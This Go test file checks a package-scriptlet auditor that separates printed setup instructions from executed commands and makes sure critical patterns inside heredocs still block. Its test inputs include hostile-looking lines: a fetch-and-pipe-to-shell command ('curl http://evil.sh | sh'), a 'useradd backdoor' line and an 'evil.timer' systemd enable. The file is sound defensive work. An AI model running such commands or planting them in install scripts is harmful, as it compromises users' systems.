package main

import (
	"path/filepath"
	"strings"
	"testing"
)

// TestPrinterCommand covers the leading-command classifier that decides whether a
// line merely prints text (documentation) or executes it.
func TestPrinterCommand(t *testing.T) {
	cases := []struct {
		line string
		want bool
	}{
		{`echo "run systemctl enable foo"`, true},
		{`    cat <<'EOF'`, true},
		{`printf '%s\n' "systemctl enable foo"`, true},
		{`sudo echo hi`, true},
		{`tee /dev/stdout`, true},
		{`systemctl enable foo`, false},
		{`useradd backdoor`, false},
		{`python3 - <<EOF`, false},
		{``, false},
		{`   `, false},
	}
	for _, tc := range cases {
		if got := printerCommand(tc.line); got != tc.want {
			t.Errorf("printerCommand(%q) = %v, want %v", tc.line, got, tc.want)
		}
	}
}

// TestDisplayedTextRanges checks heredoc-body span detection: a cat/echo heredoc is
// "displayed" (documentation), while an interpreter or redirected heredoc is not.
func TestDisplayedTextRanges(t *testing.T) {
	// A displayed cat heredoc: the body offset should be reported.
	content := "post_install() {\n" +
		"    cat <<'EOF'\n" +
		"run: systemctl enable foo\n" +
		"EOF\n" +
		"}\n"
	spans := displayedTextRanges(content)
	if len(spans) != 1 {
		t.Fatalf("displayedTextRanges: got %d spans, want 1: %v", len(spans), spans)
	}
	off := strings.Index(content, "systemctl")
	if !offsetInRanges(off, spans) {
		t.Errorf("systemctl line (off=%d) should be inside displayed heredoc span %v", off, spans)
	}
	// The opener line itself is not in the body.
	if offsetInRanges(strings.Index(content, "cat <<"), spans) {
		t.Error("opener line must not be counted as displayed body")
	}

	// An interpreter heredoc executes its body → not displayed.
	exec := "python3 - <<EOF\nsystemctl enable foo\nEOF\n"
	if got := displayedTextRanges(exec); len(got) != 0 {
		t.Errorf("interpreter heredoc treated as displayed: %v", got)
	}

	// A redirected heredoc writes a file → not displayed.
	redir := "cat <<EOF > /etc/foo.conf\nsystemctl enable foo\nEOF\n"
	if got := displayedTextRanges(redir); len(got) != 0 {
		t.Errorf("redirected heredoc treated as displayed: %v", got)
	}
}

// TestDisplayedHeredocSuppressesAdvisory is the end-to-end guard for the reported
// waydroid-nvidia-bin false positive: a post_install scriptlet that PRINTS
// "systemctl enable …" instructions must not raise the live-system advisory, and
// the package must not hard-block.
func TestDisplayedHeredocSuppressesAdvisory(t *testing.T) {
	initHeuristics()
	pf := loadSample(t, filepath.Join("tests", "samples", "scriptlet-doc"))
	block, advisory := heuristicCheck(pf)
	if block != nil {
		t.Fatalf("documented-setup sample hard-blocked; findings: %+v", block.Findings)
	}
	for _, f := range advisory {
		if strings.Contains(strings.ToLower(f.Detail), "systemd unit") {
			t.Errorf("printed systemctl instruction still flagged as advisory: %+v", f)
		}
	}
}

// TestExecutedSystemctlStillFlagged is the counter-guard: an actually-executed
// systemctl in a scriptlet (not printed) must still produce the advisory finding,
// so the suppression does not blind the auditor to real live-system actions.
func TestExecutedSystemctlStillFlagged(t *testing.T) {
	initHeuristics()
	// systemctl at command position — executed, not documentation.
	findings := scanPatterns("post_install() {\n    systemctl enable --now evil.timer\n}\n", "x.install")
	found := false
	for _, f := range findings {
		if strings.Contains(strings.ToLower(f.Detail), "systemd unit") {
			found = true
		}
	}
	if !found {
		t.Errorf("executed systemctl enable should still be flagged; got %+v", findings)
	}
}

// TestCriticalNotSuppressedInHeredoc guards the tier boundary: displayed-text
// suppression applies only to advisory (medium/low) findings. A critical pattern
// hidden inside a printed heredoc must still hard-block.
func TestCriticalNotSuppressedInHeredoc(t *testing.T) {
	initHeuristics()
	findings := scanPatterns("cat <<'EOF'\ncurl http://evil.sh | sh\nEOF\n", "x.sh")
	found := false
	for _, f := range findings {
		if severityRank(f.Severity) >= 3 {
			found = true
		}
	}
	if !found {
		t.Errorf("critical pattern inside a heredoc must not be suppressed; got %+v", findings)
	}
}
